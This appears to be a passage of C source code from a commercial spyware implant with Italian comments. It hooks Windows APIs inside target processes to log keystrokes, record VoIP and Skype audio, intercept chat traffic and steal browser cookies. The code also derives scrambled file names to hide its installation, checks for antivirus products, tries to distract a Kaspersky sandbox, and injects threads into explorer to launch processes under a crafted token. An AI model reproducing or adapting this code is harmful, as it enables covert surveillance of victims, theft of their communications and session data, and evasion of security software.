	HMMAKE_HOOK(dwPid, "SetWindowTextW", PM_SetWindowText,  SendMessageURLData, PM_SetWindowText_setup,  pServiceData, "user32.dll"); 

#ifdef __ENABLE_SCREENSHOT_MODULE
	// --- PM per Snapshot (on window creation)
	HMMAKE_HOOK(dwPid, "CreateWindowExA", PM_CreateWindowEx, CreateWindowExData, PM_CreateWindowEx_setup, pServiceData, "user32.dll"); 
	HMMAKE_HOOK(dwPid, "CreateWindowExW", PM_CreateWindowEx, CreateWindowExData, PM_CreateWindowEx_setup, pServiceData, "user32.dll"); 
	//HMMAKE_HOOK(dwPid, "ShowWindow", PM_ShowWindow, ShowWindowData, PM_ShowWindow_setup, pServiceData, "user32.dll"); 
#endif

	// --- PM per VOIP
	HMMAKE_HOOK(dwPid, "waveOutWrite", PM_waveOutWrite, waveOutWriteData, PM_waveOutWrite_setup, pServiceData, "WINMM.dll");
	HMMAKE_HOOK(dwPid, "waveInAddBuffer", PM_waveInUnprepareHeader, waveInUnprepareHeaderData, PM_waveInUnprepareHeader_setup, pServiceData, "WINMM.dll");
	HMMAKE_HOOK(dwPid, "SendMessageTimeoutA", PM_SendMessage, SendMessageData, PM_SendMessage_setup, pServiceData, "user32.dll"); // per SKYPE
	HMMAKE_HOOK(dwPid, "SendMessageTimeoutW", PM_SendMessage, SendMessageData, PM_SendMessage_setup, pServiceData, "user32.dll"); // per SKYPE
	HMMAKE_HOOK(dwPid, "recv", PM_Recv, RecvData, PM_Recv_setup, pServiceData, "Ws2_32.dll"); // per YahooMessenger
	HMMAKE_HOOK(dwPid, "send", PM_Send, RecvData, PM_Recv_setup, pServiceData, "Ws2_32.dll"); // per YahooMessenger
	HMMAKE_HOOK(dwPid, "WSARecv", PM_WSARecv, WSARecvData, PM_WSARecv_setup, pServiceData, "Ws2_32.dll");
	HMMAKE_HOOK(dwPid, NULL, PM_DSGetCP, DSGetCPData, PM_DSGetCP_setup, pServiceData, "dsound.dll");
	HMMAKE_HOOK(dwPid, NULL, PM_DSCapGetCP, DSCapGetCPData, PM_DSCapGetCP_setup, pServiceData, "dsound.dll");
	// Metto kernel32 giusto per far andare avanti la funzione, in realta' la dll viene caricata dal setup
	pServiceData->PARAM[0] = HMMAKE_HOOK(dwPid, NULL, PM_WASAPIGetBuffer, WASAPIGetBufferData, PM_WASAPIGetBuffer_setup, pServiceData, "kernel32.dll");
	if (pServiceData->PARAM[0]) {
		HMMAKE_HOOK(dwPid, NULL, PM_WASAPIReleaseBuffer, WASAPIReleaseBufferData, PM_WASAPIReleaseBuffer_setup, pServiceData, "kernel32.dll");
		pServiceData->PARAM[0] = NULL;
	}
	pServiceData->PARAM[0] = HMMAKE_HOOK(dwPid, NULL, PM_WASAPICaptureGetBuffer, WASAPIGetBufferData, PM_WASAPICaptureGetBuffer_setup, pServiceData, "kernel32.dll");
	if (pServiceData->PARAM[0]) {
		HMMAKE_HOOK(dwPid, NULL, PM_WASAPICaptureReleaseBuffer, WASAPIReleaseBufferData, PM_WASAPICaptureReleaseBuffer_setup, pServiceData, "kernel32.dll");
		pServiceData->PARAM[0] = NULL;
	}
	pServiceData->PARAM[0] = HMMAKE_HOOK(dwPid, NULL, PM_WASAPICaptureGetBufferMSN, WASAPIGetBufferData, PM_WASAPICaptureGetBufferMSN_setup, pServiceData, "kernel32.dll");
	if (pServiceData->PARAM[0]) {
		HMMAKE_HOOK(dwPid, NULL, PM_WASAPICaptureReleaseBufferMSN, WASAPIReleaseBufferData, PM_WASAPICaptureReleaseBufferMSN_setup, pServiceData, "kernel32.dll");
		pServiceData->PARAM[0] = NULL;
	}

	// --- PM per il file agent... XXX Le versioni Ascii richiamano comunque quelle WideChar
	// Tranne la MoveFileA, che comunque da explorer non viene mai richiamata...
	//HMMAKE_HOOK(dwPid, "CreateFileA", PM_CreateFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
	//HMMAKE_HOOK(dwPid, "DeleteFileA", PM_DeleteFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
	//HMMAKE_HOOK(dwPid, "MoveFileA", PM_MoveFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
#ifdef __ENABLE_PROCMON_MODULE
	HMMAKE_HOOK(dwPid, "CreateFileW", PM_CreateFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
	HMMAKE_HOOK(dwPid, "DeleteFileW", PM_DeleteFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
	HMMAKE_HOOK(dwPid, "MoveFileW", PM_MoveFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
#endif

#ifdef __ENABLE_KEYLOG_MODULES
	// --- PM per il keylog agent
	HMMAKE_HOOK(dwPid, "GetMessageA", PM_GetMessage, GetMessageData, PM_GetMessage_setup, pServiceData, "user32.dll");
	HMMAKE_HOOK(dwPid, "GetMessageW", PM_GetMessage, GetMessageData, PM_GetMessage_setup, pServiceData, "user32.dll");
	HMMAKE_HOOK(dwPid, "PeekMessageA", PM_PeekMessage, GetMessageData, PM_GetMessage_setup, pServiceData, "user32.dll");
	HMMAKE_HOOK(dwPid, "PeekMessageW", PM_PeekMessage, GetMessageData, PM_GetMessage_setup, pServiceData, "user32.dll");
	HMMAKE_HOOK(dwPid, "ImmGetCompositionStringW", PM_ImmGetCompositionString, GetMessageData, PM_GetMessage_setup, pServiceData, "imm32.dll");
	HMMAKE_HOOK(dwPid, "ReadConsoleInputA", PM_ReadConsoleInput, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
	HMMAKE_HOOK(dwPid, "ReadConsoleInputW", PM_ReadConsoleInput, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
	HMMAKE_HOOK(dwPid, "ReadConsoleA", PM_ReadConsoleA, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
	HMMAKE_HOOK(dwPid, "ReadConsoleW", PM_ReadConsoleW, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
	HMMAKE_HOOK(dwPid, "ReadConsoleInputExA", PM_ReadConsoleInputEx, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
	HMMAKE_HOOK(dwPid, "ReadConsoleInputExW", PM_ReadConsoleInputEx, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
#endif

	// Per i cookie del social
	HMMAKE_HOOK(dwPid, "InternetGetCookieExW", PM_InternetGetCookieEx, InternetGetCookieExData, PM_InternetGetCookieEx_setup, pServiceData, "wininet.dll");
	

/*	// --- PM per il print agent...
	// Le altre funzioni utilizzeranno PARAM[0] per accedere ai dati memorizzati nella
	// DataStruct di CreateDC (es: handle al memory device)
	pServiceData->PARAM[0] = HMMAKE_HOOK(dwPid, "CreateDCW", CreateDC_wrap, CreateDC_data, CreateDC_setup, pServiceData, "GDI32.dll");
	
	// Se ha creato correttamente il primo hook, inserisce tutti gli altri
	// Altrimenti scorrerebbero non avendo il puntatore alla struttura dati 
	// di CreateDC
	if (pServiceData->PARAM[0]) {
		HMMAKE_HOOK(dwPid, "CreateDCA", CreateDCA_wrap, CreateDCA_data, CreateDCA_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "DeleteDC", DeleteDC_wrap, DeleteDC_data, DeleteDC_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "StartDocW", StartDoc_wrapW, StartDoc_data, StartDoc_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "StartDocA", StartDoc_wrapA, StartDoc_data, StartDoc_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "StartPage", StartPage_wrap, StartPage_data, StartPage_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "EndPage", EndPage_wrap, EndPage_data, EndPage_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "EndDoc", EndDoc_wrap, EndDoc_data, EndDoc_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "SetAbortProc", SetAbortProc_wrap, SetAbortProc_data, SetAbortProc_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "GetDeviceCaps", GetDeviceCaps_wrap, GetDeviceCaps_data, GetDeviceCaps_setup, pServiceData, "GDI32.dll");
	}
*/
}


void WINAPI HM_sInBundleService(DWORD dwPid, HMServiceStruct *pServiceData)
{
	HMMAKE_HOOK(dwPid, NULL, IPCClientRead, ipc_read, IPCClientRead_setup, NULL, NULL);
	HMMAKE_HOOK(dwPid, NULL, IPCClientWrite, ipc_write, IPCClientWrite_setup, NULL, NULL);
	pServiceData->pHM_IpcCliRead = (HM_IPCClientRead_t) ipc_read.dwHookAdd;	
	pServiceData->pHM_IpcCliWrite = (HM_IPCClientWrite_t) ipc_write.dwHookAdd;
}

////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
// 
//								EXPORTS SECTION: END 
//
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
// 
//								STARTUP PROCUDERE: START
//
////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
//
//    Funzioni di supporto
//




// Prende un path in unicode e torna una stringa dos sicuramente valida in 
// ascii per accedere al file
char *GetDosAsciiName(WCHAR *orig_path)
{
	char *dest_a_path;
	WCHAR dest_w_path[_MAX_PATH + 2];
	DWORD mblen;

	memset(dest_w_path, 0, sizeof(dest_w_path));
	if (!FNC(GetShortPathNameW)(orig_path, dest_w_path, (sizeof(dest_w_path) / sizeof (WCHAR))-1))
		return NULL;

	if ( (mblen = FNC(WideCharToMultiByte)(CP_ACP, 0, dest_w_path, -1, NULL, 0, NULL, NULL)) == 0 )
		return NULL;

	if ( !(dest_a_path = (char *)malloc(mblen)) )
		return NULL;

	if ( FNC(WideCharToMultiByte)(CP_ACP, 0, dest_w_path, -1, (LPSTR)dest_a_path, mblen, NULL, NULL) == 0 ) {
		free(dest_a_path);
		return NULL;
	}

	return dest_a_path;
}

// Espande le variabili d'ambiente e il tag della home
// dsize e' il numero di WCHAR contenibili in dest
BOOL HM_ExpandStringsW(WCHAR *source, WCHAR *dest, DWORD dsize)
{
	WCHAR *ptr;
	WCHAR *tmp_buf;

	if (!FNC(ExpandEnvironmentStringsW)(source, dest, dsize)) 
		return FALSE;

	if ( !(tmp_buf = (WCHAR *)malloc(dsize*sizeof(WCHAR))) )
		return FALSE;

	// Espande la variabile d'ambiente fittizia della home
	while ( (ptr = wcsstr(dest, HOME_VAR_NAME_W)) ) {
		*ptr = 0;
		ptr += wcslen(HOME_VAR_NAME_W);
		if (_snwprintf_s(tmp_buf, dsize, _TRUNCATE, L"%s%S%s", dest, shared.H4_HOME_PATH, ptr) == -1 ||
			_snwprintf_s(dest, dsize, _TRUNCATE, L"%s", tmp_buf) == -1) {
			free(tmp_buf);
			return FALSE;
		}
	}
	free(tmp_buf);
	return TRUE;
}

// Espande le variabili d'ambiente e il tag della home
BOOL HM_ExpandStrings(char *source, char *dest, DWORD dsize)
{
	char *ptr;
	char *tmp_buf;

	if (!FNC(ExpandEnvironmentStringsA)(source, dest, dsize)) 
		return FALSE;

	if ( !(tmp_buf = (char *)malloc(dsize)) )
		return FALSE;

	// Espande la variabile d'ambiente fittizia della home
	while ( (ptr = strstr(dest, HOME_VAR_NAME)) ) {
		*ptr = 0;
		ptr += strlen(HOME_VAR_NAME);
		if (_snprintf_s(tmp_buf, dsize, _TRUNCATE, "%s%s%s", dest, shared.H4_HOME_PATH, ptr) == -1 ||
			_snprintf_s(dest, dsize, _TRUNCATE, "%s", tmp_buf) == -1) {
			free(tmp_buf);
			return FALSE;
		}
	}
	free(tmp_buf);
	return TRUE;
}

BOOL GetUserUniqueHash(BYTE *user_hash, DWORD hash_size)
{
	HANDLE hToken=0;
	TOKEN_USER *token_owner=NULL;
	DWORD dwLen=0;
	char *string_sid;
	BOOL ret_val = FALSE;

	if (!user_hash)
		return FALSE;
	memset(user_hash, 0, hash_size);
	if (hash_size < SHA_DIGEST_LENGTH)
		return FALSE;

	if( FNC(OpenProcessToken)(FNC(GetCurrentProcess)(), TOKEN_QUERY| TOKEN_QUERY_SOURCE, &hToken) ) {
		FNC(GetTokenInformation)(hToken, TokenUser, token_owner, 0, &dwLen);
		if (dwLen)
			token_owner = (TOKEN_USER *) malloc( dwLen );
		if(token_owner) {
			memset(token_owner, 0, dwLen);
			if( FNC(GetTokenInformation)(hToken, TokenUser, token_owner, dwLen, &dwLen) &&
				FNC(ConvertSidToStringSidA)(token_owner->User.Sid, &string_sid) ) {
				
				SHA1Context sha;
				SHA1Reset(&sha);
				SHA1Input(&sha, (const unsigned char *)string_sid, (DWORD)(strlen(string_sid)));
				if (SHA1Result(&sha)) {
					for (int i=0; i<5; i++)
						sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
					memcpy(user_hash, sha.Message_Digest, SHA_DIGEST_LENGTH);
					ret_val = TRUE;
				}
				LocalFree(string_sid);
			}
			free(token_owner);
		}
		CloseHandle(hToken);
	}
	return ret_val;
}


#define MAX_CMD_LINE 800
typedef BOOL (WINAPI *CreateProcess_t) (LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *CreateProcessAsUser_t) (HANDLE, LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *CloseHandle_t) (HANDLE);
typedef struct {
	COMMONDATA;
	CreateProcess_t pCreateProcess;
	CloseHandle_t pCloseHandle;
	char cmd_line[MAX_CMD_LINE];
	DWORD flags;
	STARTUPINFO si;
    PROCESS_INFORMATION pi;
} HMCreateProcessThreadDataStruct;

// Thread iniettato dentro explorer per effettuare CreateProcess
DWORD HM_CreateProcessThread(void *dummy)
{
	INIT_WRAPPER(HMCreateProcessThreadDataStruct);

	if (!pData->pCreateProcess(NULL, pData->cmd_line, 0, 0, FALSE, pData->flags, 0, 0, &(pData->si), &(pData->pi))) {
		pData->pi.dwProcessId = 0;
		return 0;
	}

	// Chiude gli handle aperti dentro explorer
	pData->pCloseHandle(pData->pi.hProcess);
	pData->pCloseHandle(pData->pi.hThread);
	return 1;
}

BOOL CheckDemoVersion()
{
	char demo_tag[24];

	memcpy(demo_tag, WATERMARK, sizeof(demo_tag));
	if (demo_tag[0] == '0') return FALSE;

	memcpy(demo_tag, DEMO_TAG , sizeof(demo_tag));

	if (demo_tag[0] != 'P') return FALSE;
	if (demo_tag[1] != 'g') return FALSE;
	if (demo_tag[2] != '-') return FALSE;
	if (demo_tag[3] != 'W') return FALSE;
	if (demo_tag[4] != 'a') return FALSE;
	if (demo_tag[5] != 'V') return FALSE;
	if (demo_tag[6] != 'y') return FALSE;
	if (demo_tag[7] != 'P') return FALSE;
	if (demo_tag[8] != 'z') return FALSE;
	if (demo_tag[9] != 'M') return FALSE;
	if (demo_tag[10] != 'M') return FALSE;
	if (demo_tag[11] != 'M') return FALSE;
	if (demo_tag[12] != 'M') return FALSE;
	if (demo_tag[13] != 'm') return FALSE;
	if (demo_tag[14] != 'G') return FALSE;
	if (demo_tag[15] != 'b') return FALSE;
	if (demo_tag[16] != 'h') return FALSE;
	if (demo_tag[17] != 'P') return FALSE;
	if (demo_tag[18] != '6') return FALSE;
	if (demo_tag[19] != 'q') return FALSE;
	if (demo_tag[20] != 'A') return FALSE;
	if (demo_tag[21] != 'i') return FALSE;
	if (demo_tag[22] != 'g') return FALSE;
	if (demo_tag[23] != 'T') return FALSE;

	return TRUE;
}

//Riempie i campi relativi al nome del file immagine,
//file di configurazione, directory di installazione.
//Se torna FALSE non chiude niente, tanto il processo
//poi uscira'.
BOOL HM_GuessNames()
{
	char path_name[DLLNAMELEN + 1] = {};
	char neutral_name[MAX_RAND_NAME] = {};
	char* ptr_offset = NULL;
	
	// Verifica se si tratta della versione demo o meno
	shared.is_demo_version = CheckDemoVersion();

	if (!FindModulePath(path_name, sizeof(path_name)))
		return FALSE;

	// Comincia la scomposizione del path
	// Ci assicuriamo la NULL terminazione

	// Nome DLL
	if (! (ptr_offset = FNC(StrRChrA)(path_name, NULL, '\\')) )
		return FALSE;
	_snprintf_s(shared.H4DLLNAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset+1);
	*ptr_offset = 0;

	// Path della home
	_snprintf_s(shared.H4_HOME_PATH, DLLNAMELEN, _TRUNCATE, "%s", path_name);

	// Nome directory home
	if (! (ptr_offset = FNC(StrRChrA)(path_name, NULL, '\\')) )
		return FALSE;
	_snprintf_s(shared.H4_HOME_DIR, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset+1);

	// Deriva il nome dell'altro file che puo' essere usato per l'update
	// (Uso Alphabetlen/2 per avere sempre gli stessi due nomi che ciclano)
	if ( !(ptr_offset = LOG_ScrambleName(shared.H4DLLNAME, ALPHABET_LEN/2, TRUE)) )
		return FALSE;
	_snprintf_s(shared.H4_UPDATE_FILE, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// Fra i due nomi possibili sceglie quello piu' piccolo in ordine alfabetico
	// da cui derivare i nomi rimanenti (in modo che qualsiasi dei due file
	// fra attuale e update sia utilizzato, i nomi dei file di conf, codec, etc.
	// siano gli stessi).
	if (shared.H4_UPDATE_FILE[0]< shared.H4DLLNAME[0])
		_snprintf_s(neutral_name, MAX_RAND_NAME, _TRUNCATE, "%s", shared.H4_UPDATE_FILE);
	else
		_snprintf_s(neutral_name, MAX_RAND_NAME, _TRUNCATE, "%s", shared.H4DLLNAME);

	// Il file di configurazione lo derivo dal nome "neutrale" della DLL
	// (quello fra i due dell'update piu' piccolo in ordine alfabetico).
	if ( !(ptr_offset = LOG_ScrambleName(neutral_name, 1, TRUE)) )
		return FALSE;
	_snprintf_s(shared.H4_CONF_FILE, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);
	
	// Il conf back-up lo derivo dal file di conf
	if ( !(ptr_offset = LOG_ScrambleName(shared.H4_CONF_FILE, 1, TRUE)) )
		return FALSE;
	_snprintf_s(shared.H4_CONF_BU, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// Il nome del codec lo derivo dal file di backup
	if ( !(ptr_offset = LOG_ScrambleName(shared.H4_CONF_BU, 1, TRUE)) )
		return FALSE;
	_snprintf_s(shared.H4_CODEC_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// Il nome del file dummy lo derivo dal file del codec
	if ( !(ptr_offset = LOG_ScrambleName(shared.H4_CODEC_NAME, 1, TRUE)) )
		return FALSE;
	_snprintf_s(shared.H4_DUMMY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// XXX Attenzione che dopo dummy_name c'e' il nome del driver di
	// kaspersky, della pstorec.dll e del file di capture per la webcam
	
	if ( !(ptr_offset = LOG_ScrambleName(shared.H4_DUMMY_NAME, 10, TRUE)) )
		return FALSE;
	_snprintf_s(shared.H4_MOBCORE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	if ( !(ptr_offset = LOG_ScrambleName(shared.H4_MOBCORE_NAME, 1, TRUE)) )
		return FALSE;
	_snprintf_s(shared.H4_MOBZOO_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// CONF SCRAMBLATO DI 15
	if ( !(ptr_offset = LOG_ScrambleName(shared.H4_MOBZOO_NAME, 1, TRUE)) )
		return FALSE;
	_snprintf_s(shared.H64DLL_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// Se e' 32bit prende il driver classico (dummy scramblato di 1)
	// altrimenti prende quello nuovo (conf scramblato di 16)
	if (IsX64System()) {
		if ( !(ptr_offset = LOG_ScrambleName(shared.H64DLL_NAME, 1, TRUE)) )
			return FALSE;
		_snprintf_s(shared.H4DRIVER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
		SAFE_FREE(ptr_offset);

		if ( !(ptr_offset = LOG_ScrambleName(shared.H4_DUMMY_NAME, 1, TRUE)) )
			return FALSE;
		_snprintf_s(shared.H4DRIVER_NAME_ALT, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
		SAFE_FREE(ptr_offset);

	} else {
		if ( !(ptr_offset = LOG_ScrambleName(shared.H4_DUMMY_NAME, 1, TRUE)) )
			return FALSE;
		_snprintf_s(shared.H4DRIVER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
		SAFE_FREE(ptr_offset);
		
		if ( !(ptr_offset = LOG_ScrambleName(shared.H64DLL_NAME, 1, TRUE)) )
			return FALSE;
		_snprintf_s(shared.H4DRIVER_NAME_ALT, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
		SAFE_FREE(ptr_offset);

	}

	// XXX Attenzione che i successivi li devo derivare da H4_MOBZOO_NAME scramblato di 2

	// La chiave nel registry e' binary patchata
	_snprintf_s(shared.REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", BIN_PATCHED_REGISTRY_KEY);
	//_snprintf_s(OLD_REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", BIN_PATCHED_OLD_REGISTRY_KEY);
	_snprintf_s(shared.EXE_INSTALLER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", shared.H4_HOME_DIR);

	// Genera i nomi della shared memory in base alla chiave per-cliente
	// XXX Verificare sempre che la chiave NON sia quella embeddata nel codice, maquella binary-patched
	BYTE *temp_arr = (BYTE *)WATERMARK;
	BYTE ckey_arr[16];
	for (int j=0; j<16; j++)
		ckey_arr[j] = temp_arr[j];
	ckey_arr[8] = 0;
	_snprintf_s(shared.SHARE_MEMORY_READ_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
	ckey_arr[7] = 0;
	_snprintf_s(shared.SHARE_MEMORY_WRITE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
	ckey_arr[6] = 0;
	_snprintf_s(shared.SHARE_MEMORY_ASP_COMMAND_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);

	return TRUE;
}


void IndirectCreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, BOOL inherit)
{
	HMODULE hmod = NULL;
	CreateProcess_t pCreateProcess = NULL;

	hmod = GetModuleHandle("kernel32.dll");
	if (hmod)
		pCreateProcess = (CreateProcess_t)HM_SafeGetProcAddress(hmod, "CreateProcessA");
	if (pCreateProcess)
		pCreateProcess(NULL, cmd_line, 0, 0, inherit, flags, 0, 0, si, pi);
}

void IndirectCreateProcessAsUser(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, HANDLE hToken)
{
	HMODULE hmod = NULL;
	CreateProcessAsUser_t pCreateProcessAsUser = NULL;

	if (!hToken)
		return IndirectCreateProcess(cmd_line, flags, si, pi, FALSE);

	hmod = GetModuleHandle("advapi32.dll");
	if (hmod)
		pCreateProcessAsUser = (CreateProcessAsUser_t)HM_SafeGetProcAddress(hmod, "CreateProcessAsUserA");
	if (pCreateProcessAsUser)
		pCreateProcessAsUser(hToken, NULL, cmd_line, 0, 0, FALSE, flags, 0, 0, si, pi);
}


HANDLE GetMediumLevelToken()
{
	HANDLE hToken;
	HANDLE hNewToken = NULL;

	// Medium integrity SID
	WCHAR wszIntegritySid[20] = L"S-1-16-8192";
	PSID pIntegritySid = NULL;

	TOKEN_MANDATORY_LABEL TIL = {0};
	PROCESS_INFORMATION ProcInfo = {0};
	STARTUPINFOW StartupInfo = {0};
	ULONG ExitCode = 0;

	if (OpenProcessToken(GetCurrentProcess(),MAXIMUM_ALLOWED, &hToken)) {
		if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
			if (ConvertStringSidToSidW(wszIntegritySid, &pIntegritySid)) {
				TIL.Label.Attributes = SE_GROUP_INTEGRITY;
				TIL.Label.Sid = pIntegritySid;
				SetTokenInformation(hNewToken, TokenIntegrityLevel, &TIL, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(pIntegritySid));
				LocalFree(pIntegritySid);
			}
		}
		CloseHandle(hToken);
	}
	return hNewToken;
}

// Funzione richiamata dal dropper che sceglie il processo da usare per fare la 
// CreateProcess e poi la invoca.
extern "C" void WINAPI HIDING(void);

void WINAPI HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi)
{
	DWORD dummy;

	// Cerca di "distrarre" la sandbox di kaspersky
	HIDING();

	//HideDevice dev_probe;
	
	// Ci sono degli AV con cui proprio non si deve installare
	if (IsBlackList())  {
		ReportCannotInstall();
		return;
	}
#if 0
	// Decide se e dove copiare il driver 
	// (Se c'e' ZoneAlarm E ctfmon NON mette il driver)
	if ( (IsVista(&dummy) || IsAvira() || IsDeepFreeze() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsZoneAlarm() || IsAshampoo() || IsEndPoint())
		 && !(IsZoneAlarm() && HM_FindPid("ctfmon.exe", TRUE)) && !IsRising() && !IsADAware() && !IsSunBeltPF() && !IsSophos32() && (!IsPCTools() || IsDeepFreeze()) && (!IsKaspersky() || IsDeepFreeze())  && (!IsFSecure() || IsDeepFreeze())) {
		WCHAR drv_path[DLLNAMELEN*2];
		ZeroMemory(drv_path, sizeof(drv_path));

		if (!HM_GuessNames()) {
			ReportCannotInstall();
			return;
		}

		// Copia il driver (solo se non c'e' gia')
		if (!dev_probe.isdev()) {
			if (!CopySystemDriver(drv_path)) {
				ReportCannotInstall();
				return;
			}
		}

		HideDevice dev_unhook(drv_path);
		Sleep(350); // XXX Attesa paranoica
		if (!IsAvast())
			dev_unhook.unhook_all(FALSE);
		dev_unhook.unhook_func("ZwSetValueKey", TRUE);
		dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);

		if ((IsAvira() || IsBlink() || /*IsKaspersky() ||*/ IsKerio() || IsPGuard() || IsComodo2() || IsComodo3() || IsPanda() || /*IsTrend() ||*/ IsEndPoint()) && (!dev_unhook.unhook_isdrv(DRIVER_NAME_W) && !dev_unhook.unhook_isdrv(DRIVER_NAME_OLD_W))) {
			ReportCannotInstall();
			return;
		}

		// Se c'e' deep freeze copia il core e il driver sul disco "reale"
		if (IsDeepFreeze()) {
			if (DFFixCore(&dev_unhook, (unsigned char *)H4DLLNAME, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME, FALSE)) {
				PVOID old_value = DisableWow64Fs();
				DFFixDriver(&dev_unhook, drv_path);
				RevertWow64Fs(old_value);
			}
		}
	}
#endif
	// ---------------------------------------------
	HANDLE hToken = GetMediumLevelToken();
	if (IsAVG_IS() || IsFSecure() || IsKaspersky()) {
		char exp_cmd[512];
		HM_ExpandStrings(cmd_line, exp_cmd, sizeof(exp_cmd));
		IndirectCreateProcessAsUser(exp_cmd, flags, si, pi, hToken);
		//CreateProcess(NULL, exp_cmd, 0, 0, FALSE, flags, 0, 0, si, pi);
	} else if (HM_FindPid("zlclient.exe", FALSE)) {
		// Se c'e' zonealarm usa come host ctfmon,
		// se questo non e' presente usa explorer
		HM_CreateProcessAsUser(cmd_line, flags, si, pi, HM_FindPid("ctfmon.exe", TRUE), hToken);
	} else // Non c'e' zonealarm e usa explorer
		HM_CreateProcessAsUser(cmd_line, flags, si, pi, 0, hToken);
	//HideDevice dev_unhook;
	//dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), FALSE);	
}

// Funzione per far eseguire CreateProcess a explorer (o a un altro processo specificato)
// Se fallisce ritorna 0 come child_pid nella struttura PROCESS_INFORMATION
void WINAPI HM_CreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, DWORD host_pid)
{
	HM_CreateProcessAsUser(cmd_line, flags, si, pi, host_pid, NULL);
}

void WINAPI HM_CreateProcessAsUser(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, DWORD host_pid, HANDLE hToken)
{
	HMCreateProcessThreadDataStruct HMCreateProcessThreadData;
	HMODULE hMod;
	HANDLE hThreadRem;
	HANDLE hProcess;
	DWORD dwThreadId;
	DWORD explorer_pid;
	DWORD dummy;
	BYTE *pCodeRemote;
	BYTE *pDataRemote;

	explorer_pid = host_pid;
	pi->dwProcessId = 0;
	ZeroMemory(&(HMCreateProcessThreadData.pi), sizeof(PROCESS_INFORMATION));
	memcpy(&(HMCreateProcessThreadData.si), si, sizeof(STARTUPINFO));
	HMCreateProcessThreadData.si.dwFlags |= STARTF_FORCEOFFFEEDBACK;
	HMCreateProcessThreadData.flags = flags;

	if (!HM_ExpandStrings(cmd_line, HMCreateProcessThreadData.cmd_line, sizeof(HMCreateProcessThreadData.cmd_line)))
		strcpy(HMCreateProcessThreadData.cmd_line, cmd_line);

